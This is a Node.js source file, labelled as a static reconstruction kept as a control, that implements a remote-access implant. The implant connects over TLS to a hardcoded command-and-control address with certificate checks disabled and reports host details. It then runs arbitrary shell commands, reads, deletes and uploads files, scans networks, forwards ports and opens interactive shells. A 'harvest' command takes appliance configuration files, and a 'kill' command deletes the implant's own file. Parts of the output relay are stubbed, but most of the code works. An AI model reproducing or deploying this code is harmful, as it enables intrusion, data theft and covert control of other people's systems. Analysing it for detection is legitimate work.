// Static, non-executed control derived from the reviewed reconstruction.
'use strict';
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const os = require('os');
const cp = require('child_process');
const dns = require('dns');

const CONFIG = {
  c2_host: '203.0.113.19',
  c2_port: 8443,
  heartbeat_interval: 30000,
  reconnect_base: 1000,
  reconnect_max: 300000,
  jitter: 0.3,
  tls_pin_sha256: 'unused-test-pin'
};

const HELLO = 0x01, HELLO_ACK = 0x02, HEARTBEAT = 0x03, COMMAND = 0x04,
      COMMAND_RESULT = 0x05, CHANNEL_OPEN = 0x06, CHANNEL_OPEN_ACK = 0x07,
      CHANNEL_DATA = 0x08, CHANNEL_CLOSE = 0x09, CHANNEL_EOF = 0x0a,
      LOG = 0x0b, TASK_RESULT = 0x0d;

const channels = new Map();
let nextChannelId = 1;
let heartbeatTimer = null;

function sendFrame(sock, type, payload) {
  const body = Buffer.isBuffer(payload) ? payload : Buffer.from(JSON.stringify(payload), 'utf8');
  const frame = Buffer.alloc(5 + body.length);
  frame.writeUInt32BE(body.length + 1, 0);
  frame.writeUInt8(type, 4);
  body.copy(frame, 5);
  sock.write(frame);
}

function sendChannelData(sock, channelId, data) {
  const body = Buffer.alloc(4 + data.length);
  body.writeUInt32BE(channelId, 0);
  data.copy(body, 4);
  sendFrame(sock, CHANNEL_DATA, body);
}

function hello(sock) {
  const interfaces = os.networkInterfaces();
  sendFrame(sock, HELLO, {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    node_version: process.version,
    uptime: os.uptime(),
    user: process.env.USER || 'root',
    interfaces: interfaces
  });
}

function heartbeatLoop(sock) {
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    sendFrame(sock, HEARTBEAT, { ts: Date.now() });
  }, CONFIG.heartbeat_interval);
}


function runCommand(sock, msg) {
  const { cmd_id, type, args } = msg;
  switch (type) {
    case 'exec':
      cp.exec(args.cmd, { timeout: 30000 }, (err, stdout) => {
        sendFrame(sock, COMMAND_RESULT, {
          cmd_id, data: Buffer.from(stdout || '').toString('base64'),
          error: err ? String(err) : null, done: true
        });
      });
      break;
    case 'ls':
      fs.readdir(args.path, (err, entries) => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(String(entries)).toString('base64'), error: err ? String(err) : null, done: true });
      });
      break;
    case 'cat':
      fs.readFile(args.path, (err, buf) => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: buf ? buf.toString('base64') : null, error: err ? String(err) : null, done: true });
      });
      break;
    case 'rm':
      fs.unlink(args.path, () => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: null, error: null, done: true });
      });
      break;
    case 'stat':
      fs.stat(args.path, (err, st) => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(JSON.stringify(st)).toString('base64'), error: err ? String(err) : null, done: true });
      });
      break;
    case 'ifconfig':
      sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(JSON.stringify(os.networkInterfaces())).toString('base64'), error: null, done: true });
      break;
    case 'netstat':
      cp.exec('netstat -antp', (err, stdout) => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(stdout || '').toString('base64'), error: err ? String(err) : null, done: true });
      });
      break;
    case 'ps':
      cp.exec('ps aux', (err, stdout) => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(stdout || '').toString('base64'), error: err ? String(err) : null, done: true });
      });
      break;
    case 'uname':
      sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(JSON.stringify({
        hostname: os.hostname(), platform: os.platform(), arch: os.arch(),
        release: os.release(), type: os.type(), node: process.version,
        uptime: os.uptime(), loadavg: os.loadavg(), totalmem: os.totalmem(),
        freemem: os.freemem(), cpus: os.cpus().length, kernel: os.release()
      })).toString('base64'), error: null, done: true });
      break;
    case 'portscan':
      scanRange(args.host, args.ports, (report) => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(JSON.stringify(report)).toString('base64'), error: null, done: true });
      });
      break;
    case 'dns':
      dns.resolve4(args.host, (err, addrs) => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(JSON.stringify(addrs)).toString('base64'), error: err ? String(err) : null, done: true });
      });
      break;
    case 'listen': {
      const srv = net.createServer((conn) => {
        const cid = nextChannelId++;
        channels.set(cid, conn);
        sendFrame(sock, CHANNEL_OPEN, { channel_id: cid, type: 'forward', host: 'localhost', port: args.port });
        conn.on('data', (d) => sendChannelData(sock, cid, d));
      });
      srv.listen(args.port, () => {
        sendFrame(sock, COMMAND_RESULT, { cmd_id, data: null, error: null, done: true });
      });
      break;
    }
    case 'stop_listen':
      sendFrame(sock, COMMAND_RESULT, { cmd_id, data: null, error: null, done: true });
      break;
    case 'harvest': {
      const targets = (args.files && args.files.length) ? args.files : [
        '/data/config/sys_global.conf.gz',
        '/data/config/global_system_interface.gz',
        '/data/config/sys_vd_root+root.conf.gz',
        '/data/etc/fsv_sync.dat'
      ];
      const out = {};
      for (const f of targets) {
        try { out[f] = fs.readFileSync(f).toString('base64'); } catch (e) { out[f] = null; }
      }
      sendFrame(sock, COMMAND_RESULT, { cmd_id, data: Buffer.from(JSON.stringify(out)).toString('base64'), error: null, done: true });
      break;
    }
    case 'sleep':
      CONFIG.heartbeat_interval = args.seconds * 1000;
      heartbeatLoop(sock);
      sendFrame(sock, COMMAND_RESULT, { cmd_id, data: null, error: null, done: true });
      break;
    case 'kill':
      try { fs.unlinkSync('/tmp/.agent.js'); } catch (e) {}
      sendFrame(sock, COMMAND_RESULT, { cmd_id, data: null, error: null, done: true });
      process.exit(0);
      break;
    default:
      sendFrame(sock, COMMAND_RESULT, { cmd_id, data: null, error: 'unknown command ' + type, done: true });
  }
}

function scanRange(cidr, portSpec, cb) {
  const report = {};
  const ports = parsePorts(portSpec);
  const [base, bits] = cidr.split('/');
  const size = Math.pow(2, 32 - parseInt(bits, 10));
  let pending = 0, done = false;
  const finish = () => { if (!done && pending === 0) { done = true; cb(report); } };
  for (let h = 0; h < Math.min(size, 256); h++) {
    const host = bumpHost(base, h);
    report[host] = [];
    for (const port of ports) {
      pending++;
      const s = net.connect({ host, port, timeout: 1500 });
      s.on('connect', () => { report[host].push(port); s.destroy(); pending--; finish(); });
      s.on('error', () => { pending--; finish(); });
      s.on('timeout', () => { s.destroy(); pending--; finish(); });
    }
  }
}

function parsePorts(spec) {
  const out = [];
  for (const part of String(spec).split(',')) {
    if (part.includes('-')) {
      const [a, b] = part.split('-').map(Number);
      for (let p = a; p <= b; p++) out.push(p);
    } else out.push(Number(part));
  }
  return out;
}

function bumpHost(base, n) {
  const o = base.split('.').map(Number);
  o[3] += n;
  return o.join('.');
}


function openChannel(sock, msg) {
  const { channel_id, type, host, port, cmd } = msg;
  if (type === 'shell') {
    const shells = ['/bin/sh', '/bin/bash', '/bin/ash', '/bin/dash', '/bin/busybox'];
    const child = cp.spawn(shells.find(s => fs.existsSync(s)) || '/bin/sh', [], { stdio: ['pipe', 'pipe', 'pipe'] });
    channels.set(channel_id, child);
    child.stdout.on('data', (d) => sendChannelData(sock, channel_id, Buffer.alloc(0)));
    child.stderr.on('data', (d) => sendChannelData(sock, channel_id, Buffer.alloc(0)));
    sendFrame(sock, CHANNEL_OPEN_ACK, { channel_id, success: true, error: null });
  } else if (type === 'exec') {
    const child = cp.spawn(cmd, { shell: '/bin/sh' });
    channels.set(channel_id, child);
    child.stdout.on('data', (d) => sendChannelData(sock, channel_id, Buffer.alloc(0)));
    child.on('exit', () => sendFrame(sock, CHANNEL_EOF, { channel_id }));
    sendFrame(sock, CHANNEL_OPEN_ACK, { channel_id, success: true, error: null });
  } else if (type === 'direct') {
    const upstream = net.connect({ host, port });
    channels.set(channel_id, upstream);
    upstream.on('data', (d) => sendChannelData(sock, channel_id, Buffer.alloc(0)));
    upstream.on('connect', () => sendFrame(sock, CHANNEL_OPEN_ACK, { channel_id, success: true, error: null }));
    upstream.on('error', (e) => sendFrame(sock, CHANNEL_OPEN_ACK, { channel_id, success: false, error: String(e) }));
  } else if (type === 'upload') {
    const ws = fs.createWriteStream(host);
    channels.set(channel_id, ws);
    ws.on('ready', () => sendFrame(sock, CHANNEL_OPEN_ACK, { channel_id, success: true, error: null }));
  } else if (type === 'download') {
    fs.readFile(host, (err, buf) => {
      if (err) return sendFrame(sock, CHANNEL_OPEN_ACK, { channel_id, success: false, error: String(err) });
      channels.set(channel_id, { dummy: true });
      sendChannelData(sock, channel_id, buf);
      sendFrame(sock, CHANNEL_EOF, { channel_id });
    });
  }
}


function makeParser(sock) {
  let acc = Buffer.alloc(0);
  return (chunk) => {
    acc = Buffer.concat([acc, chunk]);
    while (acc.length >= 5) {
      const len = acc.readUInt32BE(0);
      if (acc.length < 4 + len) break;
      const type = acc.readUInt8(4);
      const payload = acc.slice(5, 4 + len);
      acc = acc.slice(4 + len);
      switch (type) {
        case HELLO_ACK:
          heartbeatLoop(sock);
          break;
        case COMMAND:
          runCommand(sock, JSON.parse(payload.toString('utf8')));
          break;
        case CHANNEL_OPEN:
          openChannel(sock, JSON.parse(payload.toString('utf8')));
          break;
        case CHANNEL_DATA: {
          const cid = payload.readUInt32BE(0);
          const ch = channels.get(cid);
          const data = payload.slice(4);
          if (ch && ch.stdin) ch.stdin.write(data);
          else if (ch && ch.write) ch.write(data);
          break;
        }
        case CHANNEL_CLOSE: {
          const cid = payload.readUInt32BE(0);
          const ch = channels.get(cid);
          if (ch && ch.end) ch.end();
          channels.delete(cid);
          break;
        }
      }
    }
  };
}


let backoff = CONFIG.reconnect_base;

function connect() {
  const sock = tls.connect({
    host: CONFIG.c2_host,
    port: CONFIG.c2_port,
    rejectUnauthorized: false
  }, () => {
    backoff = CONFIG.reconnect_base;
    hello(sock);
  });

  sock.on('data', makeParser(sock));
  sock.on('error', () => { sock.destroy(); });
  sock.on('close', () => {
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    const jitter = 1 + (Math.random() * 2 - 1) * CONFIG.jitter;
    const delay = Math.min(backoff * jitter, CONFIG.reconnect_max);
    backoff = Math.min(backoff * 2, CONFIG.reconnect_max);
    setTimeout(connect, delay);
  });
}

process.on('uncaughtException', function () {});

connect();
